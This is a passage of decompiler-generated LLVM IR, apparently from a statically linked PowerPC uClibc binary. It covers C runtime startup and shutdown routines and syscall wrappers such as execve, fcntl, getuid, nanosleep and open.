  uselistorder i32 %v2_10006b24, { 1, 2, 0, 4, 3, 5, 6 }
  uselistorder i32 %v2_10006b00, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_10006afc, { 1, 0 }
  uselistorder i32 %v2_10006ae0, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r8.global-to-local, { 3, 2, 4, 0, 1 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 9, 11, 10, 2, 23, 0, 12, 26, 13, 4, 5, 17, 19, 20, 18, 6, 7, 21, 3, 22, 8, 24, 15, 25, 16, 14, 1 }
  uselistorder i32* %r11.global-to-local, { 9, 8, 4, 0, 1, 7, 6, 5, 2, 3 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %ctr.global-to-local, { 9, 8, 4, 0, 1, 7, 6, 5, 2, 3 }
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 1, 0 }
  uselistorder label %dec_label_pc_10006c7c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10006c78, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006c44, { 1, 0 }
  uselistorder label %dec_label_pc_10006c38, { 1, 0 }
  uselistorder label %dec_label_pc_10006b6c.dec_label_pc_10006b6c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10006aec.dec_label_pc_10006aec_crit_edge, { 1, 0 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_10006ce0:
  %v3_10006ce4 = load i32, i32* @global_var_1001d880.418, align 4
  %v3_10006ce8 = icmp eq i32 %v3_10006ce4, 0
  br i1 %v3_10006ce8, label %dec_label_pc_10006cf8, label %dec_label_pc_10006cf0

dec_label_pc_10006cf0:                            ; preds = %dec_label_pc_10006ce0
  %v2_10006cf4 = load i32, i32* @r4, align 4
  %v3_10006cf4 = call i32 @unknown_0(i32 268566528, i32 %v2_10006cf4)
  store i32 %v3_10006cf4, i32* @r3, align 4
  br label %dec_label_pc_10006cf8

dec_label_pc_10006cf8:                            ; preds = %dec_label_pc_10006ce0, %dec_label_pc_10006cf0
  %v3_10006cfc = load i32, i32* @global_var_1001d884.419, align 4
  %v3_10006d00 = icmp eq i32 %v3_10006cfc, 0
  br i1 %v3_10006d00, label %dec_label_pc_10006cf8.dec_label_pc_10006d10_crit_edge, label %dec_label_pc_10006d08

dec_label_pc_10006cf8.dec_label_pc_10006d10_crit_edge: ; preds = %dec_label_pc_10006cf8
  %v0_10006d20.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10006d10

dec_label_pc_10006d08:                            ; preds = %dec_label_pc_10006cf8
  %v2_10006d0c = load i32, i32* @r4, align 4
  %v3_10006d0c = call i32 @unknown_0(i32 268566528, i32 %v2_10006d0c)
  br label %dec_label_pc_10006d10

dec_label_pc_10006d10:                            ; preds = %dec_label_pc_10006cf8.dec_label_pc_10006d10_crit_edge, %dec_label_pc_10006d08
  %v0_10006d20 = phi i32 [ %v0_10006d20.pre, %dec_label_pc_10006cf8.dec_label_pc_10006d10_crit_edge ], [ %v3_10006d0c, %dec_label_pc_10006d08 ]
  ret i32 %v0_10006d20

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006d10, { 1, 0 }
  uselistorder label %dec_label_pc_10006cf8, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_10006d2c = load i32, i32* @r3, align 4
  ret i32 %v0_10006d2c
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268463444, i32* @lr, align 4
  %v2_10006d50 = call i32 @__libc_fcntl(i32 1, i32 1)
  %v3_10006d54 = icmp eq i32 %v2_10006d50, -1
  br i1 %v3_10006d54, label %dec_label_pc_10006d5c, label %dec_label_pc_10006d7c

dec_label_pc_10006d5c:                            ; preds = %entry
  %v0_10006d60 = load i32, i32* @r30, align 4
  store i32 268463472, i32* @lr, align 4
  %v3_10006d6c = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_1000c918.420 to i32), i32 %v0_10006d60)
  %v1_10006d70 = load i32, i32* @r31, align 4
  %v4_10006d70 = icmp eq i32 %v3_10006d6c, %v1_10006d70
  br i1 %v4_10006d70, label %dec_label_pc_10006d7c, label %dec_label_pc_10006d78

dec_label_pc_10006d78:                            ; preds = %dec_label_pc_10006d5c
  %v1_10006d78 = call i32 @abort(i32 %v3_10006d6c)
  br label %dec_label_pc_10006d7c

dec_label_pc_10006d7c:                            ; preds = %entry, %dec_label_pc_10006d5c, %dec_label_pc_10006d78
  %v0_10006d8c = phi i32 [ %v2_10006d50, %entry ], [ %v3_10006d6c, %dec_label_pc_10006d5c ], [ %v1_10006d78, %dec_label_pc_10006d78 ]
  ret i32 %v0_10006d8c

; uselistorder directives
  uselistorder label %dec_label_pc_10006d7c, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10006dac = load i32, i32* @global_var_1001d888.421, align 4
  %v3_10006db4 = icmp eq i32 %v3_10006dac, 0
  br i1 %v3_10006db4, label %dec_label_pc_10006dd8, label %entry.dec_label_pc_10006dfc_crit_edge

entry.dec_label_pc_10006dfc_crit_edge:            ; preds = %entry
  %v0_10006e0c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10006dfc

dec_label_pc_10006dd8:                            ; preds = %entry
  store i32 1, i32* @global_var_1001d888.421, align 4
  store i32 4096, i32* @global_var_1001d87c.340, align 4
  %v1_10006df8 = call i32 @_stdio_init(i32 268448956)
  br label %dec_label_pc_10006dfc

dec_label_pc_10006dfc:                            ; preds = %entry.dec_label_pc_10006dfc_crit_edge, %dec_label_pc_10006dd8
  %v0_10006e0c = phi i32 [ %v0_10006e0c.pre, %entry.dec_label_pc_10006dfc_crit_edge ], [ %v1_10006df8, %dec_label_pc_10006dd8 ]
  ret i32 %v0_10006e0c

; uselistorder directives
  uselistorder label %dec_label_pc_10006dfc, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %v1_10006e20 = mul i32 %arg2, 4
  store i32 %tmp, i32* @r30, align 4
  %v2_10006e2c = add i32 %tmp, %v1_10006e20
  %v0_10006e30 = load i32, i32* @r9, align 4
  store i32 %v0_10006e30, i32* @global_var_1001d874.422, align 4
  %v1_10006e34 = add i32 %v2_10006e2c, 4
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 %v1_10006e34, i32* @global_var_1001d878.416, align 4
  store i32 %arg6, i32* @global_var_1001d884.419, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  store i32 %arg5, i32* @r27, align 4
  %v2_10006e58 = load i32, i32* %arg3, align 4
  %v4_10006e5c = icmp eq i32 %v1_10006e34, %v2_10006e58
  br i1 %v4_10006e5c, label %dec_label_pc_10006e64, label %dec_label_pc_10006e68

dec_label_pc_10006e64:                            ; preds = %entry
  store i32 %v2_10006e2c, i32* @global_var_1001d878.416, align 4
  br label %dec_label_pc_10006e68

dec_label_pc_10006e68:                            ; preds = %entry, %dec_label_pc_10006e64
  %v2_10006e68 = ptrtoint i32* %stack_var_-168 to i32
  store i32 268463736, i32* @lr, align 4
  %v3_10006e74 = call i32 @__GI_memset(i32 %v2_10006e68, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_1001d878.416, align 4
  br label %dec_label_pc_10006e84

dec_label_pc_10006e84:                            ; preds = %dec_label_pc_10006e84, %dec_label_pc_10006e68
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_10006e68 ], [ %v1_10006e88, %dec_label_pc_10006e84 ]
  %v1_10006e84 = inttoptr i32 %storemerge to i32*
  %v2_10006e84 = load i32, i32* %v1_10006e84, align 4
  %v1_10006e88 = add i32 %storemerge, 4
  %v3_10006e8c = icmp eq i32 %v2_10006e84, 0
  br i1 %v3_10006e8c, label %dec_label_pc_10006e94, label %dec_label_pc_10006e84

dec_label_pc_10006e94:                            ; preds = %dec_label_pc_10006e84
  store i32 %v1_10006e88, i32* %r29.global-to-local, align 4
  %v1_10006ec012 = inttoptr i32 %v1_10006e88 to i32*
  %v2_10006ec013 = load i32, i32* %v1_10006ec012, align 4
  %v3_10006ec416 = icmp eq i32 %v2_10006ec013, 0
  br i1 %v3_10006ec416, label %dec_label_pc_10006ecc, label %dec_label_pc_10006e9c

dec_label_pc_10006e9c:                            ; preds = %dec_label_pc_10006e94, %dec_label_pc_10006ebc
  %v0_10006eb0 = phi i32 [ %v1_10006ebc, %dec_label_pc_10006ebc ], [ %v1_10006e88, %dec_label_pc_10006e94 ]
  %v0_10006ea4 = phi i32 [ %v2_10006ec0, %dec_label_pc_10006ebc ], [ %v2_10006ec013, %dec_label_pc_10006e94 ]
  %v2_10006e9c = icmp ugt i32 %v0_10006ea4, 14
  br i1 %v2_10006e9c, label %dec_label_pc_10006ebc, label %dec_label_pc_10006ea4

dec_label_pc_10006ea4:                            ; preds = %dec_label_pc_10006e9c
  %v1_10006ea4 = mul i32 %v0_10006ea4, 8
  %v2_10006eac = add i32 %v1_10006ea4, %v2_10006e68
  store i32 %v2_10006eac, i32* @r3, align 4
  store i32 %v0_10006eb0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268463804, i32* @lr, align 4
  %v0_10006eb8 = call i32 @memcpy()
  %v0_10006ebc.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10006ebc

dec_label_pc_10006ebc:                            ; preds = %dec_label_pc_10006e9c, %dec_label_pc_10006ea4
  %v0_10006ebc = phi i32 [ %v0_10006eb0, %dec_label_pc_10006e9c ], [ %v0_10006ebc.pre, %dec_label_pc_10006ea4 ]
  %v1_10006ebc = add i32 %v0_10006ebc, 8
  store i32 %v1_10006ebc, i32* %r29.global-to-local, align 4
  %v1_10006ec0 = inttoptr i32 %v1_10006ebc to i32*
  %v2_10006ec0 = load i32, i32* %v1_10006ec0, align 4
  %v3_10006ec4 = icmp eq i32 %v2_10006ec0, 0
  br i1 %v3_10006ec4, label %dec_label_pc_10006ecc, label %dec_label_pc_10006e9c

dec_label_pc_10006ecc:                            ; preds = %dec_label_pc_10006ebc, %dec_label_pc_10006e94
  %v1_10006ed0 = call i32 @_dl_aux_init(i32 %v2_10006e68)
  store i32 %v1_10006ed0, i32* @r3, align 4
  store i32 268463832, i32* @lr, align 4
  %v1_10006ed4 = call i32 @__GI___uClibc_init(i32 %v1_10006ed0)
  %v3_10006edc = icmp eq i32 %tmp27, 0
  br i1 %v3_10006edc, label %dec_label_pc_10006ee4, label %dec_label_pc_10006ee8

dec_label_pc_10006ee4:                            ; preds = %dec_label_pc_10006ecc
  br label %dec_label_pc_10006ee8

dec_label_pc_10006ee8:                            ; preds = %dec_label_pc_10006ecc, %dec_label_pc_10006ee4
  %v0_10006eec = phi i32 [ %tmp27, %dec_label_pc_10006ecc ], [ 4096, %dec_label_pc_10006ee4 ]
  store i32 %v0_10006eec, i32* @global_var_1001d87c.340, align 4
  %v3_10006ef4 = icmp eq i32 %tmp26, -1
  br i1 %v3_10006ef4, label %dec_label_pc_10006efc, label %dec_label_pc_10006f30

dec_label_pc_10006efc:                            ; preds = %dec_label_pc_10006ee8
  store i32 268463872, i32* @lr, align 4
  %v1_10006efc = call i32 @getuid(i32 268566528)
  store i32 %v1_10006efc, i32* %r29.global-to-local, align 4
  store i32 268463880, i32* @lr, align 4
  %v0_10006f04 = call i32 @geteuid()
  %v4_10006f08 = icmp eq i32 %v1_10006efc, %v0_10006f04
  br i1 %v4_10006f08, label %dec_label_pc_10006f10, label %dec_label_pc_10006f4c

dec_label_pc_10006f10:                            ; preds = %dec_label_pc_10006efc
  store i32 268463892, i32* @lr, align 4
  %v1_10006f10 = call i32 @getgid(i32 %v0_10006f04)
  store i32 %v1_10006f10, i32* %r29.global-to-local, align 4
  store i32 268463900, i32* @lr, align 4
  %v0_10006f18 = call i32 @getegid()
  %v4_10006f1c = icmp eq i32 %v1_10006f10, %v0_10006f18
  br i1 %v4_10006f1c, label %dec_label_pc_10006f24.thread, label %dec_label_pc_10006f4c

dec_label_pc_10006f24.thread:                     ; preds = %dec_label_pc_10006f10
  br label %dec_label_pc_10006f7c

dec_label_pc_10006f30:                            ; preds = %dec_label_pc_10006ee8
  %v4_10006f34 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_10006f34, label %dec_label_pc_10006f3c, label %dec_label_pc_10006f4c

dec_label_pc_10006f3c:                            ; preds = %dec_label_pc_10006f30
  br label %dec_label_pc_10006f4c

dec_label_pc_10006f4c:                            ; preds = %dec_label_pc_10006f3c, %dec_label_pc_10006f30, %dec_label_pc_10006f10, %dec_label_pc_10006efc
  store i32 268463964, i32* @lr, align 4
  %v2_10006f58 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 268463980, i32* @lr, align 4
  %v2_10006f68 = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 268463996, i32* @lr, align 4
  %v2_10006f78 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_10006f7c

dec_label_pc_10006f7c:                            ; preds = %dec_label_pc_10006f24.thread, %dec_label_pc_10006f4c
  %v0_10006f7c = load i32, i32* @r30, align 4
  %v1_10006f7c = inttoptr i32 %v0_10006f7c to i32*
  %v2_10006f7c = load i32, i32* %v1_10006f7c, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_10006f7c, i32* inttoptr (i32 268556304 to i32*), align 16
  %v0_10006fa8 = load i32, i32* @r27, align 4
  store i32 %v0_10006fa8, i32* @global_var_1001d880.418, align 4
  br i1 false, label %dec_label_pc_10006fb0, label %dec_label_pc_10007028

dec_label_pc_10006fb0:                            ; preds = %dec_label_pc_10006f7c, %dec_label_pc_10006fb0
  br i1 undef, label %dec_label_pc_10006fb0, label %dec_label_pc_10007028

dec_label_pc_10007028:                            ; preds = %dec_label_pc_10006fb0, %dec_label_pc_10006f7c
  %v0_10006fd4 = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_10006fd4)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10007038 = call i32 @__errno_location()
  %v2_10007040 = inttoptr i32 %v0_10007038 to i32*
  store i32 0, i32* %v2_10007040, align 4
  %v0_10007054 = call i32 @__GI___h_errno_location()
  %v2_1000705c = inttoptr i32 %v0_10007054 to i32*
  store i32 0, i32* %v2_1000705c, align 4
  %v0_1000706c = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_1000706c)
  %v0_10007078 = call i32 @__GI_exit()
  ret i32 %v0_10007078

; uselistorder directives
  uselistorder i32 %v2_10006ec0, { 1, 0 }
  uselistorder i32 %v1_10006ebc, { 2, 1, 0 }
  uselistorder i32 %v1_10006e88, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_10006e68, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 7, 6, 0, 5 }
  uselistorder i32 ()* @__GI_exit, { 0, 10, 2, 1, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 4096, { 0, 2, 5, 6, 1, 4, 3 }
  uselistorder i32 14, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10006fb0, { 1, 0 }
  uselistorder label %dec_label_pc_10006f7c, { 1, 0 }
  uselistorder label %dec_label_pc_10006ee8, { 1, 0 }
  uselistorder label %dec_label_pc_10006ebc, { 1, 0 }
  uselistorder label %dec_label_pc_10006e9c, { 1, 0 }
  uselistorder label %dec_label_pc_10006e68, { 1, 0 }
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10007084 = load i32, i32* @lr, align 4
  %v1_10007084 = load i1, i1* @cr0_so, align 1
  %v2_10007084 = xor i1 %v1_10007084, true
  call void @__pseudo_cond_branch(i1 %v2_10007084, i32 %v0_10007084)
  %v0_10007088 = call i32 @__syscall_error()
  ret i32 %v0_10007088
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100070a4 = call i32 @__asm_mfcr()
  %v1_100070a8 = and i32 %v0_100070a4, 268435456
  %v3_100070a8 = icmp eq i32 %v1_100070a8, 0
  store i32 %v0_100070a4, i32* %r31.global-to-local, align 4
  br i1 %v3_100070a8, label %dec_label_pc_100070c0, label %dec_label_pc_100070b4

dec_label_pc_100070b4:                            ; preds = %entry
  %v0_100070b4 = call i32 @__errno_location()
  %v0_100070b8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100070b8 = inttoptr i32 %v0_100070b4 to i32*
  store i32 %v0_100070b8, i32* %v2_100070b8, align 4
  br label %dec_label_pc_100070c0

dec_label_pc_100070c0:                            ; preds = %entry, %dec_label_pc_100070b4
  %v0_100070d0 = phi i32 [ %v0_100070a4, %entry ], [ -1, %dec_label_pc_100070b4 ]
  ret i32 %v0_100070d0

; uselistorder directives
  uselistorder label %dec_label_pc_100070c0, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_100070e4 = add i32 %arg2, -12
  %v2_100070ec = icmp ugt i32 %v1_100070e4, 2
  %v2_100070f0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100070f0, i32* %stack_var_-32, align 4
  br i1 %v2_100070ec, label %dec_label_pc_10007120, label %dec_label_pc_10007110

dec_label_pc_10007110:                            ; preds = %entry
  store i32 268464408, i32* @lr, align 4
  %v2_10007114 = call i32 @__GI_fcntl64(i32 3)
  store i32 %v2_10007114, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007140

dec_label_pc_10007120:                            ; preds = %entry
  %v0_10007124 = call i32 @__asm_mfcr()
  %v1_10007128 = and i32 %v0_10007124, 268435456
  %v3_10007128 = icmp eq i32 %v1_10007128, 0
  store i32 %v0_10007124, i32* %r31.global-to-local, align 4
  br i1 %v3_10007128, label %dec_label_pc_10007140, label %dec_label_pc_10007134

dec_label_pc_10007134:                            ; preds = %dec_label_pc_10007120
  %v0_10007134 = call i32 @__errno_location()
  %v0_10007138 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007138 = inttoptr i32 %v0_10007134 to i32*
  store i32 %v0_10007138, i32* %v2_10007138, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007140

dec_label_pc_10007140:                            ; preds = %dec_label_pc_10007120, %dec_label_pc_10007110, %dec_label_pc_10007134
  %v0_10007144 = phi i32 [ %v0_10007124, %dec_label_pc_10007120 ], [ %v2_10007114, %dec_label_pc_10007110 ], [ -1, %dec_label_pc_10007134 ]
  ret i32 %v0_10007144

; uselistorder directives
  uselistorder i32 -12, { 5, 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10007140, { 2, 0, 1 }
}

define i32 @__GI_fcntl64(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_1000716c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000716c, i32* %stack_var_-32, align 4
  %v0_1000718c = call i32 @__asm_mfcr()
  %v1_10007190 = and i32 %v0_1000718c, 268435456
  %v3_10007190 = icmp eq i32 %v1_10007190, 0
  store i32 %v0_1000718c, i32* %r31.global-to-local, align 4
  br i1 %v3_10007190, label %dec_label_pc_100071a8, label %dec_label_pc_1000719c

dec_label_pc_1000719c:                            ; preds = %entry
  %v0_1000719c = call i32 @__errno_location()
  %v0_100071a0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100071a0 = inttoptr i32 %v0_1000719c to i32*
  store i32 %v0_100071a0, i32* %v2_100071a0, align 4
  br label %dec_label_pc_100071a8

dec_label_pc_100071a8:                            ; preds = %entry, %dec_label_pc_1000719c
  %v0_100071b8 = phi i32 [ %v0_1000718c, %entry ], [ -1, %dec_label_pc_1000719c ]
  ret i32 %v0_100071b8

; uselistorder directives
  uselistorder label %dec_label_pc_100071a8, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_100071d0

dec_label_pc_100071d0:                            ; preds = %dec_label_pc_100071d0.backedge, %entry
  %v0_100071dc = call i32 @__asm_mfcr()
  %v1_100071e0 = and i32 %v0_100071dc, 268435456
  %v3_100071e0 = icmp eq i32 %v1_100071e0, 0
  store i32 %v0_100071dc, i32* %r31.global-to-local, align 4
  br i1 %v3_100071e0, label %dec_label_pc_100071d0.backedge, label %dec_label_pc_100071ec

dec_label_pc_100071ec:                            ; preds = %dec_label_pc_100071d0
  %v0_100071ec = call i32 @__errno_location()
  %v0_100071f0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100071f0 = inttoptr i32 %v0_100071ec to i32*
  store i32 %v0_100071f0, i32* %v2_100071f0, align 4
  br label %dec_label_pc_100071d0.backedge

dec_label_pc_100071d0.backedge:                   ; preds = %dec_label_pc_100071ec, %dec_label_pc_100071d0
  br label %dec_label_pc_100071d0
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007210 = call i32 @__asm_mfcr()
  %v1_10007214 = and i32 %v0_10007210, 268435456
  %v3_10007214 = icmp eq i32 %v1_10007214, 0
  store i32 %v0_10007210, i32* %r31.global-to-local, align 4
  br i1 %v3_10007214, label %dec_label_pc_1000722c, label %dec_label_pc_10007220

dec_label_pc_10007220:                            ; preds = %entry
  %v0_10007220 = call i32 @__errno_location()
  %v0_10007224 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007224 = inttoptr i32 %v0_10007220 to i32*
  store i32 %v0_10007224, i32* %v2_10007224, align 4
  br label %dec_label_pc_1000722c

dec_label_pc_1000722c:                            ; preds = %entry, %dec_label_pc_10007220
  %v0_1000723c = phi i32 [ %v0_10007210, %entry ], [ -1, %dec_label_pc_10007220 ]
  ret i32 %v0_1000723c

; uselistorder directives
  uselistorder label %dec_label_pc_1000722c, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007258 = call i32 @__asm_mfcr()
  %v1_1000725c = and i32 %v0_10007258, 268435456
  %v3_1000725c = icmp eq i32 %v1_1000725c, 0
  store i32 %v0_10007258, i32* %r31.global-to-local, align 4
  br i1 %v3_1000725c, label %dec_label_pc_10007274, label %dec_label_pc_10007268

dec_label_pc_10007268:                            ; preds = %entry
  %v0_10007268 = call i32 @__errno_location()
  %v0_1000726c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000726c = inttoptr i32 %v0_10007268 to i32*
  store i32 %v0_1000726c, i32* %v2_1000726c, align 4
  br label %dec_label_pc_10007274

dec_label_pc_10007274:                            ; preds = %entry, %dec_label_pc_10007268
  %v0_10007284 = phi i32 [ %v0_10007258, %entry ], [ -1, %dec_label_pc_10007268 ]
  ret i32 %v0_10007284

; uselistorder directives
  uselistorder label %dec_label_pc_10007274, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100072a0 = call i32 @__asm_mfcr()
  %v1_100072a4 = and i32 %v0_100072a0, 268435456
  %v3_100072a4 = icmp eq i32 %v1_100072a4, 0
  store i32 %v0_100072a0, i32* %r31.global-to-local, align 4
  br i1 %v3_100072a4, label %dec_label_pc_100072bc, label %dec_label_pc_100072b0

dec_label_pc_100072b0:                            ; preds = %entry
  %v0_100072b0 = call i32 @__errno_location()
  %v0_100072b4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100072b4 = inttoptr i32 %v0_100072b0 to i32*
  store i32 %v0_100072b4, i32* %v2_100072b4, align 4
  br label %dec_label_pc_100072bc

dec_label_pc_100072bc:                            ; preds = %entry, %dec_label_pc_100072b0
  %v0_100072cc = phi i32 [ %v0_100072a0, %entry ], [ -1, %dec_label_pc_100072b0 ]
  ret i32 %v0_100072cc

; uselistorder directives
  uselistorder label %dec_label_pc_100072bc, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100072e8 = call i32 @__asm_mfcr()
  %v1_100072ec = and i32 %v0_100072e8, 268435456
  %v3_100072ec = icmp eq i32 %v1_100072ec, 0
  store i32 %v0_100072e8, i32* %r31.global-to-local, align 4
  br i1 %v3_100072ec, label %dec_label_pc_10007304, label %dec_label_pc_100072f8

dec_label_pc_100072f8:                            ; preds = %entry
  %v0_100072f8 = call i32 @__errno_location()
  %v0_100072fc = load i32, i32* %r31.global-to-local, align 4
  %v2_100072fc = inttoptr i32 %v0_100072f8 to i32*
  store i32 %v0_100072fc, i32* %v2_100072fc, align 4
  br label %dec_label_pc_10007304

dec_label_pc_10007304:                            ; preds = %entry, %dec_label_pc_100072f8
  %v0_10007314 = phi i32 [ %v0_100072e8, %entry ], [ -1, %dec_label_pc_100072f8 ]
  ret i32 %v0_10007314

; uselistorder directives
  uselistorder label %dec_label_pc_10007304, { 1, 0 }
}

define i32 @getuid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007330 = call i32 @__asm_mfcr()
  %v1_10007334 = and i32 %v0_10007330, 268435456
  %v3_10007334 = icmp eq i32 %v1_10007334, 0
  store i32 %v0_10007330, i32* %r31.global-to-local, align 4
  br i1 %v3_10007334, label %dec_label_pc_1000734c, label %dec_label_pc_10007340

dec_label_pc_10007340:                            ; preds = %entry
  %v0_10007340 = call i32 @__errno_location()
  %v0_10007344 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007344 = inttoptr i32 %v0_10007340 to i32*
  store i32 %v0_10007344, i32* %v2_10007344, align 4
  br label %dec_label_pc_1000734c

dec_label_pc_1000734c:                            ; preds = %entry, %dec_label_pc_10007340
  %v0_1000735c = phi i32 [ %v0_10007330, %entry ], [ -1, %dec_label_pc_10007340 ]
  ret i32 %v0_1000735c

; uselistorder directives
  uselistorder label %dec_label_pc_1000734c, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007378 = call i32 @__asm_mfcr()
  %v1_1000737c = and i32 %v0_10007378, 268435456
  %v3_1000737c = icmp eq i32 %v1_1000737c, 0
  store i32 %v0_10007378, i32* %r31.global-to-local, align 4
  br i1 %v3_1000737c, label %dec_label_pc_10007394, label %dec_label_pc_10007388

dec_label_pc_10007388:                            ; preds = %entry
  %v0_10007388 = call i32 @__errno_location()
  %v0_1000738c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000738c = inttoptr i32 %v0_10007388 to i32*
  store i32 %v0_1000738c, i32* %v2_1000738c, align 4
  br label %dec_label_pc_10007394

dec_label_pc_10007394:                            ; preds = %entry, %dec_label_pc_10007388
  %v0_100073a4 = phi i32 [ %v0_10007378, %entry ], [ -1, %dec_label_pc_10007388 ]
  ret i32 %v0_100073a4

; uselistorder directives
  uselistorder label %dec_label_pc_10007394, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_100073b8 = and i32 %arg2, 64
  %v3_100073b8 = icmp eq i32 %v1_100073b8, 0
  br i1 %v3_100073b8, label %dec_label_pc_100073e8, label %dec_label_pc_100073cc

dec_label_pc_100073cc:                            ; preds = %entry
  %v2_100073d4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100073d4, i32* %stack_var_-32, align 4
  %v0_100073e4 = load i32, i32* @r5, align 4
  br label %dec_label_pc_100073e8

dec_label_pc_100073e8:                            ; preds = %entry, %dec_label_pc_100073cc
  %v0_100073e8 = phi i32 [ 0, %entry ], [ %v0_100073e4, %dec_label_pc_100073cc ]
  store i32 %v0_100073e8, i32* @r5, align 4
  %v0_100073f0 = call i32 @__asm_mfcr()
  %v1_100073f4 = and i32 %v0_100073f0, 268435456
  %v3_100073f4 = icmp eq i32 %v1_100073f4, 0
  store i32 %v0_100073f0, i32* %r31.global-to-local, align 4
  br i1 %v3_100073f4, label %dec_label_pc_1000740c, label %dec_label_pc_10007400

dec_label_pc_10007400:                            ; preds = %dec_label_pc_100073e8
  %v0_10007400 = call i32 @__errno_location()
  %v0_10007404 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007404 = inttoptr i32 %v0_10007400 to i32*
  store i32 %v0_10007404, i32* %v2_10007404, align 4
  br label %dec_label_pc_1000740c

dec_label_pc_1000740c:                            ; preds = %dec_label_pc_100073e8, %dec_label_pc_10007400
  %v0_1000741c = phi i32 [ %v0_100073f0, %dec_label_pc_100073e8 ], [ -1, %dec_label_pc_10007400 ]
